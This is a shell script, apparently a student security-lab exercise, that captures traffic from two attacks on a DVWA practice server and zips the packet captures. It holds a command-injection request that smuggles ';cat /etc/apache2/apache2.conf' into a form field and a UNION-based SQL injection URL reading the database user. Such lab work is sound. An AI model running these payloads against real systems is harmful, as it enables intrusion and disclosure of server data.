#!/bin/sh


GROUP=111
NAME=ivanovii

COOKIES=./cookies.secret

AGENT_SQLI=$NAME-sqli
AGENT_CI=$NAME-ci

SQLI_PCAP=$NAME-sqli.pcapng
CJ_PCAP=$NAME-ci.pcapng

Help()
{
   # Display Help
   echo "Add description of the script functions here."
   echo
   echo "Syntax: scriptTemplate [-h|c|s|z]"
   echo "options:"
   echo "h     Print this Help."
   echo "c     Command integration (Agent ci)."
   echo "s     SQL injection."
   echo "z     Make Archive."
   echo
}

CommandIntegration()
{
	PHPSESSID=$(cat $COOKIES)
	curl -A $AGENT_CI -s -b "PHPSESSID=$PHPSESSID;security=low" -d 'ip=;cat+/etc/apache2/apache2.conf&Submit=Submit' http://dvwa.rerand0m.ru/vulnerabilities/exec/   	
}

SqlInjection()
{
	PHPSESSID=$(cat $COOKIES)
	curl -A $AGENT_SQLI -s -b "PHPSESSID=$PHPSESSID;security=low" -v "http://dvwa.rerand0m.ru/vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+system_user%28%29+%23&Submit=Submit#"
}

MakeZip()
{
	zip $NAME-$GROUP-p2.zip $SQLI_PCAP $CJ_PCAP
}

while getopts ":hcsz" option; do
	case $option in
    	h)
        	Help
        	exit;;
       	c)
			CommandIntegration
        	exit;;
        s)
			SqlInjection
        	exit;;
        z)
			MakeZip
			exit;;
    	\?) 
        	echo "Error: Invalid option"
         	exit;;
   esac
done
